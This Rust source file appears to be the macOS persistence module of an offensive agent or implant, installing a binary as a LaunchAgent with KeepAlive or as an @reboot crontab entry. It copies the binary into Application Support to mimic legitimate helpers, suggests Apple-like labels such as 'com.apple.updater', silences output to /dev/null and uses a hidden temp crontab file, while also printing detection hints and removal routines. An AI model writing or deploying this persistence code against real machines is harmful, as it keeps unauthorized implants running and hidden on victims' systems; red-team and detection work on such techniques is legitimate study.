// src/agent/persistence/macos.rs
//
// macOS persistence implementations.
//
// LaunchAgent (T1543.001): Writes a property list to
// ~/Library/LaunchAgents/<label>.plist. Launchd picks it up automatically
// on next login — no exec needed for install. Immediate load is possible
// via `launchctl load <plist>` but spawns a child process, so that step
// is left to the operator if desired.
//
// Crontab (T1053.003): Same approach as the Linux implementation —
// reads existing crontab, appends an @reboot entry, and reloads via
// the `crontab` binary (the only non-root path on macOS).

#![cfg(target_os = "macos")]

use std::fs;
use std::path::PathBuf;
use std::process::Command;

// ── Helpers ───────────────────────────────────────────────────────────

fn home_dir() -> Result<PathBuf, String> {
    std::env::var("HOME")
        .map(PathBuf::from)
        .map_err(|_| "HOME not set".to_string())
}

fn launch_agents_dir() -> Result<PathBuf, String> {
    Ok(home_dir()?.join("Library").join("LaunchAgents"))
}

fn plist_path(label: &str) -> Result<PathBuf, String> {
    Ok(launch_agents_dir()?.join(format!("{label}.plist")))
}

// ── Stable drop location ──────────────────────────────────────────────
//
// Copies `source` to ~/Library/Application Support/<name>/<name>,
// mirroring the layout of legitimate macOS background helpers.
// Sets the executable bit and returns the destination path.

fn stable_drop(source: &str, name: &str) -> Result<String, String> {
    let support_dir = home_dir()?
        .join("Library")
        .join("Application Support")
        .join(name);
    std::fs::create_dir_all(&support_dir)
        .map_err(|e| format!("mkdir Application Support/{name}: {e}"))?;

    let dst = support_dir.join(name);
    let dst_str = dst.to_string_lossy().into_owned();

    let already = std::fs::canonicalize(source)
        .ok()
        .zip(std::fs::canonicalize(&dst).ok())
        .map(|(a, b)| a == b)
        .unwrap_or(false);

    if !already {
        std::fs::copy(source, &dst)
            .map_err(|e| format!("stable_drop: {} → {dst_str}: {e}", source))?;

        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(&dst, std::fs::Permissions::from_mode(0o755))
            .map_err(|e| format!("chmod {dst_str}: {e}"))?;
    }

    Ok(dst_str)
}


//
// Apple plist XML format. The KeepAlive key causes launchd to restart
// the process if it exits — equivalent to Restart=on-failure in systemd.
// RunAtLoad: true fires on login. ThrottleInterval prevents a crash loop
// from hammering the system.

fn build_plist(label: &str, binary_path: &str) -> String {
    format!(
        r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
  "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>{label}</string>
    <key>ProgramArguments</key>
    <array>
        <string>{binary_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>ThrottleInterval</key>
    <integer>30</integer>
    <key>StandardOutPath</key>
    <string>/dev/null</string>
    <key>StandardErrorPath</key>
    <string>/dev/null</string>
</dict>
</plist>
"#
    )
}

pub fn install_launchagent(label: &str, binary_path: &str) -> Result<String, String> {
    // Derive a short name from the last component of the label (e.g. "updater" from "com.apple.updater")
    let name = label.rsplit('.').next().unwrap_or(label);
    let stable = stable_drop(binary_path, name)?;

    let dir  = launch_agents_dir()?;
    let path = plist_path(label)?;

    fs::create_dir_all(&dir)
        .map_err(|e| format!("mkdir LaunchAgents: {e}"))?;

    let plist = build_plist(label, &stable);
    fs::write(&path, &plist)
        .map_err(|e| format!("Write plist: {e}"))?;

    use std::os::unix::fs::PermissionsExt;
    fs::set_permissions(&path, fs::Permissions::from_mode(0o600))
        .map_err(|e| format!("chmod plist: {e}"))?;

    Ok(format!(
        "[+] LaunchAgent installed\n    Copied:  {} → {stable}\n    Label:   {label}\n    Plist:   {}\n    \
         Load now: launchctl load {}\n    \
         Detection: file create in ~/Library/LaunchAgents/, ESF event, Unified Log (launchd)",
        binary_path,
        path.display(),
        path.display()
    ))
}

pub fn remove_launchagent(label: &str) -> Result<String, String> {
    let path = plist_path(label)?;

    if !path.exists() {
        return Ok(format!("[~] No LaunchAgent plist found for label: {label}"));
    }

    // Unload first (best-effort — ignore error if not loaded)
    let _ = Command::new("launchctl")
        .args(["unload", &path.to_string_lossy()])
        .output();

    fs::remove_file(&path)
        .map_err(|e| format!("Remove plist: {e}"))?;

    Ok(format!("[+] LaunchAgent '{label}' removed"))
}

// ── T1053.003 — Crontab ───────────────────────────────────────────────

pub fn install_cron(binary_path: &str) -> Result<String, String> {
    let name = std::path::Path::new(binary_path)
        .file_name()
        .map(|n| n.to_string_lossy().into_owned())
        .unwrap_or_else(|| "agent".to_string());
    let stable = stable_drop(binary_path, &name)?;

    let current = Command::new("crontab")
        .arg("-l")
        .output()
        .map_err(|e| format!("crontab -l: {e}"))?;

    let existing = String::from_utf8_lossy(&current.stdout);

    if existing.contains(&stable) {
        return Ok(format!("[~] Cron entry already present for: {stable}"));
    }

    let new_content = if existing.trim().is_empty() {
        format!("@reboot {stable}\n")
    } else {
        format!("{}\n@reboot {stable}\n", existing.trim_end_matches('\n'))
    };

    let tmp = format!("/tmp/.cron_{}", std::process::id());
    fs::write(&tmp, &new_content).map_err(|e| format!("Write temp crontab: {e}"))?;

    let rc = Command::new("crontab")
        .arg(&tmp)
        .status()
        .map_err(|e| format!("crontab <tmp>: {e}"))?;
    let _ = fs::remove_file(&tmp);

    if !rc.success() {
        return Err(format!("crontab install exited {}", rc.code().unwrap_or(-1)));
    }

    Ok(format!(
        "[+] Cron persistence installed\n    Copied: {} → {stable}\n    Entry:  @reboot {stable}\n    \
         Detection: /usr/lib/cron/tabs/<user> write, auditd path=/var/spool/cron/crontabs",
        binary_path
    ))
}

pub fn remove_cron(binary_path: &str) -> Result<String, String> {
    let current = Command::new("crontab")
        .arg("-l")
        .output()
        .map_err(|e| format!("crontab -l: {e}"))?;

    let existing = String::from_utf8_lossy(&current.stdout);
    let filtered: String = existing
        .lines()
        .filter(|l| !l.contains(binary_path))
        .map(|l| format!("{l}\n"))
        .collect();

    if filtered == existing.to_string() {
        return Ok(format!("[~] No cron entry found for: {binary_path}"));
    }

    let tmp = format!("/tmp/.cron_{}", std::process::id());
    fs::write(&tmp, &filtered).map_err(|e| format!("Write temp crontab: {e}"))?;

    let rc = Command::new("crontab")
        .arg(&tmp)
        .status()
        .map_err(|e| format!("crontab reload: {e}"))?;
    let _ = fs::remove_file(&tmp);

    if rc.success() {
        Ok(format!("[+] Removed cron entry for: {binary_path}"))
    } else {
        Err(format!("crontab reload exited {}", rc.code().unwrap_or(-1)))
    }
}

// ── Inventory ─────────────────────────────────────────────────────────

pub fn list() -> String {
    let mut out = Vec::new();

    // LaunchAgents
    out.push("=== LaunchAgents (~/Library/LaunchAgents/) ===".to_string());
    match launch_agents_dir().and_then(|d| fs::read_dir(&d).map_err(|e| e.to_string())) {
        Ok(entries) => {
            let plists: Vec<_> = entries
                .flatten()
                .filter(|e| e.path().extension().map(|x| x == "plist").unwrap_or(false))
                .map(|e| format!("  {}", e.file_name().to_string_lossy()))
                .collect();
            if plists.is_empty() {
                out.push("  (none)".into());
            } else {
                out.extend(plists);
            }
        }
        Err(e) => out.push(format!("  Error: {e}")),
    }

    // Crontab
    out.push("\n=== Crontab ===".to_string());
    match Command::new("crontab").arg("-l").output() {
        Ok(o) if o.status.success() => {
            let text = String::from_utf8_lossy(&o.stdout);
            let entries: Vec<_> = text
                .lines()
                .filter(|l| !l.trim_start().starts_with('#') && !l.trim().is_empty())
                .collect();
            if entries.is_empty() {
                out.push("  (empty)".into());
            } else {
                out.extend(entries.iter().map(|l| format!("  {l}")));
            }
        }
        _ => out.push("  (no crontab)".into()),
    }

    out.join("\n")
}
